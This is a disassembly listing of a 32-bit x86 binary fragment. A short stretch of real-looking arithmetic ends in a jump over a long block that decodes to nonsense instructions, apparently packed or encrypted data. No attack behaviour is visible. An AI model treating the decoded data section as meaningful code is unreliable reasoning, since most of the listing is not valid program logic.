  4230a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4230a5:	mov    BYTE PTR [edx+ebx*1],al
  4230a8:	mov    eax,DWORD PTR [ebp-0x1c]
  4230ab:	mov    edx,DWORD PTR [ebp-0xc]
  4230ae:	xor    eax,esi
  4230b0:	add    eax,edi
  4230b2:	imul   eax,edx
  4230b5:	mov    edx,DWORD PTR [ebp-0x8]
  4230b8:	mov    al,BYTE PTR [eax+edx*1]
  4230bb:	mov    BYTE PTR [ebp-0x1],al
  4230be:	mov    eax,DWORD PTR [ebp-0x1c]
  4230c1:	mov    edx,DWORD PTR [ebp-0xc]
  4230c4:	xor    eax,esi
  4230c6:	add    eax,edi
  4230c8:	imul   eax,edx
  4230cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4230ce:	xor    edx,esi
  4230d0:	add    eax,edx
  4230d2:	jmp    0x423b1a
  4230d7:	mov    ds:0x985c80eb,eax
  4230dc:	stos   DWORD PTR es:[edi],eax
  4230dd:	arpl   WORD PTR [ebx-0x7e],sp
  4230e0:	jg     0x4230ad
  4230e2:	xchg   BYTE PTR [eax+0x34],bh
  4230e5:	pop    ds
  4230e6:	push   edi
  4230e7:	mov    cl,0x94
  4230e9:	popa   
  4230ea:	bound  edx,QWORD PTR [edi+0x78]
  4230ed:	bound  esp,QWORD PTR [edx+0x3e]
  4230f0:	or     edi,DWORD PTR [esi]
  4230f2:	add    DWORD PTR ds:0x27e035c3,edx
  4230f8:	pusha  
  4230f9:	add    BYTE PTR [ebp+0x331fd3be],dh
  4230ff:	cdq    
  423100:	pop    es
  423101:	mov    ecx,0x513254ca
  423106:	retf   
  423107:	leave  
  423108:	sub    al,0xbc
  42310a:	(bad)  
  42310b:	mov    ch,0xb5
  42310d:	ror    dl,cl
  42310f:	xor    bl,BYTE PTR [ebx+esi*1]
  423112:	mov    al,BYTE PTR [esi]
  423114:	push   ds
  423115:	or     eax,0x1c56cc94
  42311a:	in     eax,0x5a
  42311c:	ret    0xdb4c
  42311f:	je     0x42313a
  423121:	sub    esp,DWORD PTR [ebp-0x4]
  423124:	dec    edx
  423125:	enter  0xd8a0,0x64
  423129:	xchg   ebp,eax
  42312a:	sub    eax,0x973825af
  42312f:	dec    esi
  423130:	or     BYTE PTR [edx-0x7c8fcf45],ch
  423136:	(bad)  
  423137:	push   ss
  423138:	inc    esi
  423139:	repnz push eax
  42313b:	shr    eax,cl
  42313d:	mov    dh,BYTE PTR [ebx]
  42313f:	popa   
  423140:	push   edx
  423141:	aas    
  423142:	call   0xba9f:0x4cb303cd
  423149:	ins    BYTE PTR es:[edi],dx
  42314a:	cmp    ch,BYTE PTR [esi]
  42314c:	push   cs
  42314d:	je     0x4230e8
  42314f:	(bad)  
  423150:	sbb    al,0xe8
  423152:	mov    dh,0x29
  423154:	mov    esi,0x9281cc6d
  423159:	mov    edx,0x86a44a09
  42315e:	sub    eax,0x263c400e
  423163:	adc    ebp,DWORD PTR [esp+ebp*8-0x7f]
  423167:	imul   ecx,DWORD PTR ds:0x2509a121,0x35
  42316e:	or     eax,0xbd294d72
  423173:	lea    esp,[ebx]
  423175:	popa   
  423176:	fldenv [edi+0x57]
  423179:	mov    cl,0xc3
  42317b:	loope  0x423150
  42317d:	fnstcw WORD PTR [ebp-0x6]
  423180:	push   edx
  423181:	div    edi
  423183:	cmp    DWORD PTR [edi],esp
  423185:	dec    eax
  423186:	(bad)  
  423187:	fiadd  WORD PTR [ebp-0x1a25753d]
  42318d:	add    eax,0x641b8cdb
  423192:	mov    ds:0x967db17a,al
  423197:	fs in  al,dx
  423199:	pop    esi
  42319a:	push   esp
  42319b:	jb     0x4231c7
  42319d:	or     al,0xa2
  42319f:	push   0xffffffd6
  4231a1:	or     eax,0xa64da9d6
  4231a6:	fwait
  4231a7:	inc    esi
  4231a8:	mov    ch,0x44
  4231aa:	xchg   esi,eax
  4231ab:	or     BYTE PTR [edi+0x42],ch
  4231ae:	pusha  
  4231af:	aaa    
  4231b0:	or     edx,DWORD PTR [edx]
  4231b2:	dec    ebp
  4231b3:	(bad)  
  4231b4:	sbb    esp,DWORD PTR gs:[esi-0x6d]
  4231b8:	pushf  
  4231b9:	cld    
  4231ba:	leave  
  4231bb:	xchg   ebx,eax
  4231bc:	fiadd  WORD PTR [eax-0x49]
  4231bf:	xchg   esi,eax
  4231c0:	rcr    esi,1
  4231c2:	enter  0xa0f7,0xad
  4231c6:	xchg   esi,eax
  4231c7:	fwait
  4231c8:	loop   0x42319a
  4231ca:	fcom   QWORD PTR [ebx+eax*8-0x61]
  4231ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231cf:	ss mov ebx,0x431cab5e
  4231d5:	and    al,BYTE PTR [edi+0x74]
  4231d8:	lahf   
  4231d9:	(bad)
  4231dc:	add    bh,bl
  4231de:	push   0x2c
  4231e0:	test   DWORD PTR [ebx-0x76],edi
  4231e3:	imul   edi,DWORD PTR [ecx+0x378e7c6e],0x29ce004e
  4231ed:	sub    BYTE PTR [eax+0x7f],ah
  4231f0:	or     cl,dh
  4231f2:	fstp   TBYTE PTR [ebx]
  4231f4:	int3   
  4231f5:	daa    
  4231f6:	mov    edi,0x14b7c86f
  4231fb:	fld    DWORD PTR [ebx+eiz*8-0x653eee69]
  423202:	cmp    eax,0xba27d43d
  423207:	adc    ebp,DWORD PTR [ebx-0x7c90b84e]
  42320d:	ds dec ebx
  42320f:	jmp    0x42324a
  423211:	or     ecx,DWORD PTR [edi+0x6bbc0d9]
  423217:	mov    ebx,0xa6f9bf28
  42321c:	push   edx
  42321d:	(bad)  
  42321e:	mov    esi,0xc12cf3b4
  423223:	xor    esp,0x6f8a9a93
  423229:	int3   
  42322a:	mov    ds:0x63544c63,eax
  42322f:	mov    edx,0x65391369
  423234:	clc    
  423235:	pop    edi
  423236:	jmp    0x8d64:0xeefae66c
  42323d:	jl     0x423243
  42323f:	push   edx
  423240:	mov    dl,0x1a
  423242:	pop    ebp
  423243:	add    esi,DWORD PTR [edi+0x5d]
  423246:	adc    ebp,DWORD PTR [edx]
  423248:	mov    db4,ebx
  42324b:	or     BYTE PTR [ecx-0x2],dh
  42324e:	cmp    eax,0x116ca831
  423253:	fst    QWORD PTR [esp+edi*8]
  423256:	add    al,0x2f
  423258:	test   al,0x33
  42325a:	mov    DWORD PTR [edi],edx
  42325c:	cmp    al,0xf0
  42325e:	inc    ecx
  42325f:	fwait
  423260:	adc    al,0x5c
  423262:	fstp   TBYTE PTR [ecx+0x67]
  423265:	jg     0x42326b
  423267:	add    esp,ebp
  423269:	scas   al,BYTE PTR es:[edi]
  42326a:	icebp  
  42326b:	in     eax,dx
  42326c:	imul   eax,DWORD PTR [edi],0x73
  42326f:	inc    edi
  423270:	in     eax,0x37
  423272:	jb     0x4232c4
  423274:	jmp    0xcb5ce194
  423279:	in     al,0xcf
  42327b:	xchg   ecx,eax
  42327c:	jecxz  0x423281
  42327e:	lock push eax
  423280:	cmp    ebp,DWORD PTR [esi+edx*1]
  423283:	out    dx,eax
  423284:	sub    eax,0xc15b9866
  423289:	jmp    0x4232aa
  42328b:	aas    
  42328c:	mov    eax,0x2194dd65
  423291:	pop    ecx
  423292:	arpl   WORD PTR [ebx+0x6b],di
  423295:	dec    eax
  423296:	jbe    0x423303
  423298:	mov    cs,WORD PTR [esi-0x61]
  42329b:	xlat   BYTE PTR ds:[ebx]
  42329c:	shr    BYTE PTR [edi+0x43],1
  42329f:	(bad)  
  4232a0:	mov    bh,0xb6
  4232a2:	mov    dh,0x1b
  4232a4:	push   es
  4232a5:	sbb    al,0xfe
  4232a7:	lods   eax,DWORD PTR ds:[esi]
  4232a8:	fucom  st(1)
  4232aa:	cmp    DWORD PTR [edx+0x6aab3ca4],eax
  4232b0:	and    eax,0xef46eacc
  4232b5:	outs   dx,DWORD PTR ds:[esi]
  4232b6:	mov    ds:0x294a1d18,al
  4232bb:	jmp    FWORD PTR [eax]
  4232bd:	or     eax,0xde635d22
  4232c2:	(bad)  
  4232c3:	sbb    bh,BYTE PTR [edx]
  4232c5:	test   al,0x4c
  4232c7:	or     eax,0x1c2dae9b
  4232cc:	jns    0x4232ba
  4232ce:	es push ebx
  4232d0:	rol    DWORD PTR [ebp+eiz*1-0x5450976b],0xe0
  4232d8:	sbb    eax,0xb97b59df
  4232dd:	dec    esi
  4232de:	lahf   
  4232df:	xlat   BYTE PTR ds:[ebx]
  4232e0:	jae    0x4232a4
  4232e2:	inc    ebx
  4232e3:	gs inc ebp
  4232e5:	dec    edi
  4232e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232e7:	xor    al,0x1a
  4232e9:	or     esi,DWORD PTR [ecx-0x13]
  4232ec:	outs   dx,DWORD PTR ds:[esi]
  4232ed:	pop    eax
  4232ee:	outs   dx,DWORD PTR ds:[esi]
  4232ef:	stos   DWORD PTR es:[edi],eax
  4232f0:	lods   eax,DWORD PTR ds:[esi]
  4232f1:	je     0x42334e
  4232f3:	push   eax
  4232f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232f5:	push   ds
  4232f6:	adc    DWORD PTR [ebx-0x6dbd9b1e],ebp
  4232fc:	rcr    ecx,cl
  4232fe:	xchg   ecx,eax
  4232ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423300:	push   esp
  423301:	mov    ah,0xc3
  423303:	sbb    ebx,DWORD PTR [esi-0x62]
  423306:	mov    bl,0xa3
  423308:	inc    esi
  423309:	daa    
  42330a:	cdq    
  42330b:	pushf  
  42330c:	push   esp
  42330d:	xor    DWORD PTR [edi-0x54a4a350],edx
  423313:	sub    bh,ch
  423315:	mov    esp,0xabfacede
  42331a:	stos   DWORD PTR es:[edi],eax
  42331b:	mov    bh,0xb6
  42331d:	sbb    eax,0x6dceb41
  423322:	jb     0x423301
  423324:	outs   dx,BYTE PTR ds:[esi]
  423325:	xchg   esp,eax
  423326:	xor    DWORD PTR [ecx-0x9],ebp
  423329:	out    0x8c,al
  42332b:	xchg   ebp,eax
  42332c:	mov    cl,0x55
  42332e:	sub    bh,cl
  423330:	loope  0x42335f
  423332:	int3   
  423333:	sub    al,0xac
  423335:	lock call 0xfbda:0xd55348b4
  42333d:	add    ebp,DWORD PTR [ecx]
  42333f:	dec    esi
  423340:	jge    0x4232eb
  423342:	imul   esi,DWORD PTR [ecx+0x77],0xffffffbd
  423346:	sbb    ecx,esp
  423348:	aad    0x96
  42334a:	int3   
  42334b:	and    eax,0x988413e9
  423350:	or     eax,0xda2e1286
  423355:	aam    0xa8
  423357:	push   ebx
  423358:	mov    ebp,0xbb106d59
  42335d:	xchg   DWORD PTR [edx-0x50],ebp
  423360:	push   0xffffffaa
  423362:	icebp  
  423363:	sbb    al,0x90
  423365:	xor    DWORD PTR [ebp+0x7cecd2e7],edx
  42336b:	out    0xdf,eax
  42336d:	addr16 mov eax,ds:0x653d
  423371:	pushf  
  423372:	adc    BYTE PTR [eax],dh
  423374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423375:	xor    BYTE PTR [eax-0x4f4ffd6e],bl
  42337b:	imul   eax,ebp,0xe44ae3b7
  423381:	repz loop 0x423318
  423384:	jle    0x423349
  423386:	push   eax
  423387:	inc    edx
  423388:	clc    
  423389:	push   0x889a5225
  42338e:	les    edx,FWORD PTR [edi+0x7522f08d]
  423394:	(bad)  
  423395:	repz xor ecx,DWORD PTR [ebp+0x13]
  423399:	jne    0x4233ef
  42339b:	mov    edx,0x2fa77667
  4233a0:	push   esi
  4233a1:	jge    0x423365
  4233a3:	rol    BYTE PTR [esi+0x3c],cl
  4233a6:	ret    
  4233a7:	mov    esp,0x54fc1697
  4233ac:	fs sbb ecx,esp
  4233af:	rcr    DWORD PTR [ebx+edi*1+0x19],cl
  4233b3:	sbb    eax,0xeaec509c
  4233b8:	xchg   ebx,eax
  4233b9:	cs mov ecx,0xf1dfa0ab
  4233bf:	dec    edi
  4233c0:	jge    0x4233a8
  4233c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233c3:	mov    edx,0xac6d8a37
  4233c8:	stos   DWORD PTR es:[edi],eax
  4233c9:	sti    
  4233ca:	cmp    edx,DWORD PTR [ebx]
  4233cc:	(bad)  
  4233cd:	cmp    eax,0xfd2d3aff
  4233d2:	or     ebx,DWORD PTR [ebx-0x2b298abf]
  4233d8:	dec    eax
  4233d9:	lds    esi,FWORD PTR [ebx-0x3b]
  4233dc:	sub    eax,0x9cfbcefc
  4233e1:	jo     0x423363
  4233e3:	jg     0x42339b
  4233e5:	out    dx,al
  4233e6:	and    BYTE PTR [edx+eax*4],bh
  4233e9:	pop    esp
  4233ea:	xchg   esi,eax
  4233eb:	push   cs
  4233ec:	jb     0x42340e
  4233ee:	mov    ah,0x4d
  4233f0:	push   ebx
  4233f1:	pop    edi
  4233f2:	js     0x423461
  4233f4:	sub    ebx,DWORD PTR [eax]
  4233f6:	sahf   
  4233f7:	imul   ebx,DWORD PTR [ebx+0x5a209595],0x7c782d4
  423401:	data16 mov al,ds:0x58c01b29
  423407:	in     al,dx
  423408:	dec    ebx
  423409:	inc    esp
  42340a:	je     0x42345b
  42340c:	in     eax,0x15
  42340e:	add    DWORD PTR [esi-0x4fd627a1],0x302406c4
  423418:	out    0x8b,al
  42341a:	shl    ch,0x6e
  42341d:	aad    0x41
  42341f:	(bad)  
  423420:	sbb    bl,BYTE PTR [eax+0x17dc398c]
  423426:	mov    WORD PTR ds:0x65d62617,gs
  42342c:	or     BYTE PTR [esi],0x10
  42342f:	iret   
  423430:	rcr    DWORD PTR [edi-0x3b755937],cl
  423436:	mov    WORD PTR [ebx-0x93a9e8c],ss
  42343c:	mov    ds:0x68457b6f,al
  423441:	test   BYTE PTR [esi],dl
  423443:	loopne 0x42349b
  423445:	add    dl,BYTE PTR [edx]
  423447:	lods   al,BYTE PTR ds:[esi]
  423448:	mov    edi,0xd3ae799c
  42344d:	arpl   WORD PTR [ebx-0x71],bx
  423450:	cmp    DWORD PTR ds:0xc647b15f,ebx
  423456:	adc    eax,0xd1aa68aa
  42345b:	push   ecx
  42345c:	or     dl,al
  42345e:	test   al,0xb5
  423460:	jae    0x4234c7
  423462:	cmp    BYTE PTR [ecx],ah
  423464:	cwde   
  423465:	xchg   edi,eax
  423466:	pop    ds
  423467:	pop    eax
  423468:	ds jp  0x423457
  42346b:	das    
  42346c:	in     al,0x7c
  42346e:	mov    esp,0x2ff1acc5
  423473:	out    dx,al
  423474:	adc    dl,BYTE PTR [eax]
  423476:	fs iret 
  423478:	ret    
  423479:	sub    BYTE PTR [eax-0x27],al
  42347c:	cmp    bl,BYTE PTR [edx]
  42347e:	test   al,0x54
  423480:	cmp    eax,0x7627b127
  423485:	jle    0x4234f8
  423487:	popa   
  423488:	jge    0x423455
  42348a:	cmp    BYTE PTR [ecx-0x50819b67],0xcd
  423491:	jo     0x42341d
  423493:	jecxz  0x42345e
  423495:	mov    ds:0x19f22bb6,al
  42349a:	dec    edx
  42349b:	and    eax,0xb16c4932
  4234a0:	out    0xb7,eax
  4234a2:	shl    al,1
  4234a4:	push   ds
  4234a5:	mov    edx,0x7746a41b
  4234aa:	mov    esi,0x447d063f
  4234af:	cld    
  4234b0:	les    edi,FWORD PTR [edx]
  4234b2:	mov    al,ds:0x44da7ef5
  4234b7:	push   ss
  4234b8:	xor    ch,BYTE PTR [eax+0x5ac9ff63]
  4234be:	jne    0x4234b9
  4234c0:	adc    edi,esi
  4234c2:	(bad)  
  4234c3:	jmp    0xad77a08f
  4234c8:	mov    esp,0x188479c4
  4234cd:	mov    cl,0x41
  4234cf:	out    dx,eax
  4234d0:	xchg   ebp,eax
  4234d1:	lods   al,BYTE PTR ds:[esi]
  4234d2:	pop    ds
  4234d3:	daa    
  4234d4:	adc    eax,0x91c7931f
  4234d9:	dec    esi
  4234da:	adc    dh,BYTE PTR [ebp-0x5e0030f3]
  4234e0:	adc    al,0xfd
  4234e2:	xchg   edi,eax
  4234e3:	and    ecx,DWORD PTR ds:0x26035a52
  4234e9:	and    dl,BYTE PTR [edi+edx*8-0x340af1ad]
  4234f0:	push   ebp
  4234f1:	xor    DWORD PTR [edi],ebx
  4234f3:	adc    ax,0xd032
  4234f7:	clc    
  4234f8:	dec    ebp
  4234f9:	sub    ah,BYTE PTR [edi+0x793f217c]
  4234ff:	imul   BYTE PTR [edi-0x3]
  423502:	xor    eax,0x2e90521d
  423507:	in     al,dx
  423508:	int3   
  423509:	call   0x9db9:0xf08ed583
  423510:	pop    ss
  423511:	icebp  
  423512:	int3   
  423513:	mov    DWORD PTR [eax+0x4a],eax
  423516:	mov    eax,ds:0x6403181a
  42351b:	pop    es
  42351c:	jno    0x42358e
  42351e:	iret   
  42351f:	fidiv  WORD PTR [ecx]
  423521:	test   ah,0xe8
  423524:	jge    0x4234c0
  423526:	ja     0x4234dd
  423528:	loop   0x423556
  42352a:	data16 sbb al,0xf7
  42352d:	in     eax,0xb0
  42352f:	add    edi,esi
  423531:	mov    ecx,0xe17ff2ef
  423536:	ds sti 
  423538:	mov    ch,0x36
  42353a:	sbb    al,0x30
  42353c:	mov    eax,0xffab007e
  423541:	add    al,0x91
  423543:	(bad)  
  423544:	lahf   
  423545:	push   ss
  423546:	aad    0xbf
  423548:	adc    dl,dh
  42354a:	shr    cl,1
  42354c:	xlat   BYTE PTR ds:[ebx]
  42354e:	jnp    0x4234d5
  423550:	das    
  423551:	adc    edx,DWORD PTR [ecx+0x622b2e8b]
  423557:	rcr    DWORD PTR [eax+0x73],cl
  42355a:	(bad)  
  42355b:	fs mov cl,0x46
  42355e:	pop    ebx
  42355f:	inc    edx
  423560:	(bad)  [esi+0x7e]
  423563:	adc    eax,0x48fadbcf
  423568:	ret    0x95a6
  42356b:	dec    edx
  42356c:	stc    
  42356d:	pop    edx
  42356e:	push   edx
  42356f:	xor    BYTE PTR [eax],0xa8
  423572:	cmp    BYTE PTR [ecx+eiz*8-0x4c],al
  423576:	repz popf 
  423578:	les    eax,FWORD PTR [ecx]
  42357a:	xchg   edx,eax
  42357b:	test   BYTE PTR [edx+edx*8+0x1e],cl
  42357f:	out    0xbd,eax
  423581:	imul   BYTE PTR [esi]
  423583:	jno    0x42350c
  423585:	push   es
  423586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423587:	push   esp
  423588:	js     0x423528
  42358a:	xchg   esi,eax
  42358b:	leave  
  42358c:	shl    DWORD PTR [eax+0x7c61bb92],cl
  423592:	fs sti 
  423594:	sbb    al,0x6
  423596:	xchg   ecx,eax
  423597:	hlt    
  423598:	repnz add eax,DWORD PTR [esi]
  42359b:	unpckhps xmm3,xmm1
  42359e:	popf   
  42359f:	mov    al,0xe6
  4235a1:	xor    eax,0xacb3a380
  4235a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235a7:	push   ebp
  4235a8:	pusha  
  4235a9:	add    eax,0x2bb99370
  4235ae:	pusha  
  4235af:	arpl   ax,sp
  4235b1:	lds    ebp,FWORD PTR [ebp+0x38]
  4235b4:	out    dx,eax
  4235b5:	xchg   ecx,eax
  4235b6:	adc    BYTE PTR gs:[ecx-0x41656f95],0x29
  4235be:	adc    al,0xb3
  4235c0:	aad    0x34
  4235c2:	inc    ecx
  4235c3:	or     BYTE PTR [ebx+eax*8-0x453f159a],bl
  4235ca:	test   al,0xca
  4235cc:	jmp    0xf89c:0x3afbc251
  4235d3:	push   eax
  4235d4:	adc    al,0x91
  4235d6:	les    esi,FWORD PTR [eax+0x2cd3bcff]
  4235dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235dd:	retf   0x9ac0
  4235e0:	imul   ebx,DWORD PTR [esi],0x10
  4235e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235e4:	cld    
  4235e5:	mov    al,ds:0x1c8c71aa
  4235ea:	sbb    BYTE PTR [edx-0x25908548],ah
  4235f0:	(bad)  
  4235f1:	scas   al,BYTE PTR es:[edi]
  4235f2:	pop    es
  4235f3:	push   esp
  4235f4:	mov    bl,0xcb
  4235f6:	mov    WORD PTR [esi],fs
  4235f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235f9:	je     0x423598
  4235fb:	les    edi,FWORD PTR [ebx+0x7b]
  4235fe:	loop   0x42362d
  423600:	gs xchg ebx,eax
  423602:	jmp    0xc996:0x12e8f9d4
  423609:	fimul  DWORD PTR [edx-0x60daeab0]
  42360f:	imul   edi,DWORD PTR [esi],0x6a
  423612:	inc    eax
  423613:	xchg   DWORD PTR [ecx],eax
  423615:	jmp    0x4235a4
  423617:	or     al,0x89
  423619:	push   0xb1850f44
  42361e:	jg     0x4235ab
  423620:	mov    ch,0x78
  423622:	lods   eax,DWORD PTR ds:[esi]
  423623:	rcl    BYTE PTR [ebp-0x4f],1
  423626:	mov    bh,0xf2
  423628:	in     eax,dx
  423629:	push   cs
  42362a:	xchg   esp,eax
  42362b:	adc    bh,BYTE PTR [ebx+0x563a3d7d]
  423631:	and    ah,BYTE PTR [ebp+ebx*1+0x4a8e79a8]
  423638:	arpl   di,bx
  42363a:	sub    eax,DWORD PTR [esi+0xdc829f6]
  423640:	xor    DWORD PTR [edx-0x222c7e55],edx
  423646:	daa    
  423647:	or     DWORD PTR [ebx+0x42],edx
  42364a:	js     0x423630
  42364c:	inc    esp
  42364d:	and    DWORD PTR [ebx+0xd507c81],eax
  423653:	mov    edx,0xf28e3dcc
  423658:	cmp    edi,DWORD PTR ds:0xada9ecee
  42365e:	inc    edx
  42365f:	sahf   
  423660:	out    0xb5,eax
  423662:	or     dl,al
  423664:	es push esp
  423666:	std    
  423667:	ins    BYTE PTR es:[edi],dx
  423668:	xor    bl,BYTE PTR [edi+0x665efd8a]
  42366e:	dec    ebp
  42366f:	hlt    
  423670:	hlt    
  423671:	icebp  
  423672:	jp     0x42367b
  423674:	repnz imul ecx,esi
  423678:	lods   eax,DWORD PTR ds:[esi]
  423679:	cs aad 0xb9
  42367c:	pushf  
  42367d:	inc    DWORD PTR [ebx-0x4ee7dd2f]
  423683:	cmp    DWORD PTR [edx],ebx
  423685:	int    0x34
  423687:	jge    0x42369c
  423689:	clc    
  42368a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42368b:	scas   eax,DWORD PTR es:[edi]
  42368c:	sti    
  42368d:	imul   edi,DWORD PTR [eax],0xffffffb8
  423690:	retf   0xe87e
  423693:	ss cmp eax,0x15131c4c
  423699:	popa   
  42369a:	mov    dl,0x5d
  42369c:	add    eax,0x54707a11
  4236a1:	ins    BYTE PTR es:[edi],dx
  4236a2:	mov    ds:0x3958617d,al
  4236a7:	sub    ax,0x36e0
  4236ab:	cmp    edi,DWORD PTR [esi]
  4236ad:	lds    eax,FWORD PTR [ebx]
  4236af:	xlat   BYTE PTR ds:[ebx]
  4236b0:	stos   DWORD PTR es:[edi],eax
  4236b1:	(bad)  
  4236b2:	sub    al,0x4c
  4236b4:	xchg   DWORD PTR [ecx],ebp
  4236b6:	inc    edx
  4236b7:	stos   DWORD PTR es:[edi],eax
  4236b8:	popa   
  4236b9:	add    al,0xef
  4236bb:	lahf   
  4236bc:	cmc    
  4236bd:	xor    eax,0xf0017906
  4236c2:	sub    esp,DWORD PTR [edx+0x4]
  4236c5:	ret    0x9880
  4236c8:	mov    WORD PTR [esi],cs
  4236ca:	inc    esi
  4236cb:	sub    DWORD PTR [ecx+0x22],edi
  4236ce:	xchg   esp,eax
  4236cf:	push   esp
  4236d0:	inc    edi
  4236d1:	jne    0x42373e
  4236d3:	xchg   edx,eax
  4236d4:	pop    edx
  4236d5:	out    dx,al
  4236d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236d7:	and    eax,0xe9f36f88
  4236dc:	loopne 0x42370e
  4236de:	push   DWORD PTR [ebp-0x55373f7a]
  4236e4:	sbb    eax,0x5ae53737
  4236e9:	leave  
  4236ea:	rcl    edx,cl
  4236ec:	jae    0x423722
  4236ee:	or     al,0x84
  4236f0:	jle    0x42370b
  4236f2:	add    eax,0xa897a9d1
  4236f7:	cdq    
  4236f8:	sahf   
  4236f9:	leave  
  4236fa:	dec    esi
  4236fb:	and    BYTE PTR [ecx+0x72d972f0],dl
  423701:	xor    eax,0xb848e0dd
  423706:	sub    esp,DWORD PTR ds:0x719f1b58
  42370c:	popf   
  42370d:	cmp    al,0xeb
  42370f:	xor    eax,DWORD PTR [ebp-0x222580d9]
  423715:	inc    ecx
  423716:	les    eax,FWORD PTR [edx]
  423718:	jge    0x423793
  42371a:	add    DWORD PTR ds:0x668b4ab8,eax
  423720:	lea    ebx,[edx+0x70]
  423723:	loop   0x423765
  423725:	scas   al,BYTE PTR es:[edi]
  423726:	xchg   esi,eax
  423727:	adc    BYTE PTR [edx-0x4770bc83],dh
  42372d:	pop    es
  42372e:	sti    
  42372f:	mov    ebp,0xc841251f
  423734:	sahf   
  423735:	xor    BYTE PTR [edx+0x13],dl
  423738:	mov    ds:0x27cd36d1,al
  42373d:	call   0x963d:0xf007a985
  423744:	mov    esi,DWORD PTR [esi+ebp*2+0x74]
  423748:	das    
  423749:	xchg   edx,eax
  42374a:	enter  0x7ed3,0x84
  42374e:	enter  0x5833,0x8
  423752:	add    eax,edi
  423754:	or     DWORD PTR [eax+0x1a142406],esp
  42375a:	js     0x4237b0
  42375c:	xor    eax,0x28097f67
  423761:	ja     0x4237a9
  423763:	adc    BYTE PTR [edi],0x33
  423766:	cmp    al,dl
  423768:	out    dx,al
  423769:	jmp    0x140f3da8
  42376e:	or     ebp,ebp
  423770:	jmp    0x1533dac9
  423775:	mov    ebp,0x45cc6150
  42377a:	test   DWORD PTR [ebx+0x53fbcfd5],ecx
  423780:	leave  
  423781:	ins    BYTE PTR es:[edi],dx
  423782:	add    bl,BYTE PTR [ebp-0x7ca69f23]
  423788:	add    esi,DWORD PTR [edi+edx*1-0x6edb8a16]
  42378f:	inc    ecx
  423790:	sbb    al,0x74
  423792:	push   edi
  423793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423794:	je     0x42371a
  423796:	mov    ds:0x387be680,al
  42379b:	out    dx,al
  42379c:	cmp    ah,BYTE PTR [edi+0x4b]
  42379f:	add    ebp,DWORD PTR [esi+0x3402b716]
  4237a5:	addr16 mov esi,0xd935d0f5
  4237ab:	adc    BYTE PTR [edi+edx*4],ah
  4237ae:	retf   
  4237af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237b0:	sbb    dl,0x47
  4237b3:	ja     0x42374d
  4237b5:	fwait
  4237b6:	mov    ecx,0xe2c04743
  4237bb:	stc    
  4237bc:	pop    edx
  4237bd:	mov    eax,eax
  4237bf:	and    eax,0x9b1e8a25
  4237c4:	enter  0xc3ff,0x89
  4237c8:	(bad)  
  4237c9:	in     al,0xea
  4237cb:	fs retf 
  4237cd:	inc    ecx
  4237ce:	xor    DWORD PTR [edx-0x1cfd6cd7],0x8c338450
  4237d8:	xor    BYTE PTR [ecx],ch
  4237da:	jo     0x4237f5
  4237dc:	xchg   esp,eax
  4237dd:	outs   dx,BYTE PTR ds:[esi]
  4237de:	cmp    eax,0x6bb3ebca
  4237e3:	push   edx
  4237e4:	enter  0xaba0,0xc9
  4237e8:	mov    esi,0x651350cd
  4237ed:	scas   eax,DWORD PTR es:[edi]
  4237ee:	sbb    DWORD PTR [eax],edx
  4237f0:	clc    
  4237f1:	adc    bh,BYTE PTR cs:[ebx+0x13]
  4237f5:	fsubr  DWORD PTR [ecx+0x5f957709]
  4237fb:	sub    esp,0xffffffa7
  4237fe:	dec    ebx
  4237ff:	mov    cl,0xc9
  423801:	dec    ebp
  423802:	test   edx,edx
  423804:	cmp    BYTE PTR [eax],0x15
  423807:	in     al,dx
  423808:	nop
  423809:	int3   
  42380a:	cmp    bl,bh
  42380c:	out    0xdb,eax
  42380e:	xchg   ebp,eax
  42380f:	cld    
  423810:	std    
  423811:	retf   0x787f
  423814:	in     eax,dx
  423815:	xchg   DWORD PTR [ebp-0x77],ebp
  423818:	mov    eax,ds:0x9a16d973
  42381d:	iret   
  42381e:	mov    bl,0x67
  423820:	pop    DWORD PTR [ebx-0x1ad88c49]
  423826:	imul   ebx,DWORD PTR [eax+edx*1+0x32],0x4e
  42382b:	ret    0x5321
  42382e:	cmp    BYTE PTR [eax+0x49],dl
  423831:	jg     0x42387e
  423833:	cld    
  423834:	arpl   WORD PTR [ebx],ax
  423836:	cmp    eax,0xff33b2ee
  42383b:	mov    eax,0xcca67eff
  423840:	push   eax
  423841:	mov    ah,0x27
  423843:	lock inc esi
  423845:	js     0x4238b8
  423847:	in     eax,0xbf
  423849:	xchg   DWORD PTR [eax],edi
  42384b:	scas   al,BYTE PTR es:[edi]
  42384c:	xchg   DWORD PTR [esi+eax*2+0x35],esi
  423850:	fst    DWORD PTR [edi-0x4b]
  423853:	sub    al,0xd7
  423855:	jno    0x4237f3
  423857:	jmp    0x5ccfa4c7
  42385c:	push   ecx
  42385d:	shl    BYTE PTR [edx-0x42],1
  423860:	mov    al,ds:0xd2e89ca6
  423865:	pop    ebp
  423866:	out    0xdd,eax
  423868:	dec    edi
  423869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42386a:	aas    
  42386b:	arpl   WORD PTR [edx-0x7],di
  42386e:	sbb    esp,eax
  423870:	imul   ebp,DWORD PTR [edx],0x72916064
  423876:	jp     0x4238a9
  423878:	push   eax
  423879:	stos   DWORD PTR es:[edi],eax
  42387a:	pop    ebx
  42387b:	loop   0x4238af
  42387d:	or     BYTE PTR [ebp-0x79],al
  423880:	xor    ebx,esi
  423882:	adc    BYTE PTR [esi],0x6b
